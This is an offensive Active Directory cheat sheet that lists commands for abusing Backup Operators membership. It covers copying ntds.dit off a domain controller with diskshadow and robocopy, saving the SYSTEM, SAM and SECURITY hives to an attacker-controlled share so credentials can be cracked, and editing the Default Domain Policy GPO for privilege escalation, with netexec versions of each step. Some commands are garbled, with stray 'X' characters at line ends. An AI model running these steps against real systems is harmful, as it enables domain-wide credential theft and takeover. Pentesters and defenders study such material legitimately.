# Backup Operators

Can generally log in on any machines of the domain.

## 1) File System backup

Can backup the entire file system of a machine (DC included) and have full read/write rights on the backup

### 1) To backup a folder:

    robocopy /B C:\Users\Administrator\Desktop\ C:\tmp\tmp.txt /E

### 2) To backup with Diskshadow + Robocopy:

1) Create a script.txt file to backup with Diskshadow

        set verbose onX
        set metadata C:\Windows\Temp\meta.cabX
        set context clientaccessibleX
        set context persistentX
        begin backupX
        add volume C: alias cdriveX
        createX
        expose %cdrive% E:X
        end backupX

2) Backup with 

        diskshadow /s script.txt

3) Retrieve the backup with robocopy and send the NTDS file in the current folder : 

        robocopy /b E:\Windows\ntds . ntds.dit

4) Then retrieve the SYSTEM registry hive to decrypt and profit 

        reg save hklm\system c:\temp\system

### 3) To backup with Diskshadow + DLLs:

1) Similar script for Diskshadow

2) With these DLLs https://github.com/giuliano108/SeBackupPrivilege

        Import-Module .\SeBackupPrivilegeCmdLets.dll
        Import-Module .\SeBackupPrivilegeUtils.dll

        Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\temp\ntds.dit -Overwrite
        reg save HKLM\SYSTEM c:\temp\system.hive

## 2) Registry read rights

The Backup Operators can read all the machines registry

    python3 reg.py 'domain.local'/'user1':'Password123'@<target>.domain.local query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'

##### Backup the SAM, SECURITY and SYSTEM registry keys

    reg.py -dc-ip <DC_IP> 'domain.local'/'user1':'Password123'@server.domain.local backup -o \\<attacker_IP>\share

## 3) GPOs read/write rights

Normally the Backup Operators can read and rights all the domain and DC GPOs with robocopy in backup mode

1) Found the interesting GPO with Get-NetGPO . For example Default Domain Policy in the Domain Controller policy

2) Get the file at the path 

        \\dc.domain.local\SYSVOL\domain.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf 
    
and add whatever you want in it

3) Write the file with robocopy:

        robocopy "C:\tmp" "\\dc.domain.local\SYSVOL\domain.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /ZB
   

## Alternate Method: Netexec

### 1) Backup a folder content

    nxc smb <target> -u user1 -p password -X "robocopy /B C:\Users\Administrator\Desktop\ C:\tmp\tmp.txt /E"

### 2) Backup with diskshadow + robocopy

Create the script.txt, then backup with diskshadow with Netexec

    nxc smb <target> -u user1 -p password -X "diskshadow /s script.txt"

Retrieve the backup with robovopy and send the NTDS file in the current folder

    nxc smb <target> -u user1 -p password -X "robocopy /B E:\Windows\ntds . ntds.dit"

Then retrieve the SYSTEM registry hive to decrypt and profit

    reg save hklm\system c:\temp\system

### 3) GPOs read/write rights

Normally the Backup Operators can read and rights all the domain and DC GPOs with robocopy in backup mode

Found the interesting GPO with Get-NetGPO . For example Default Domain Policy in the Domain Controller policy

Get the file at the path \\dc.domain.local\SYSVOL\domain.local\Policies\{GPO_ID}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf and add whatever you want in it

Write the file with robocopy:

    nxc smb <target> -u user1 -p password -X 'robocopy "C:\tmp" "\\dc.domain.local\SYSVOL\domain.local\Policies\{GPO_ID}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /ZB'
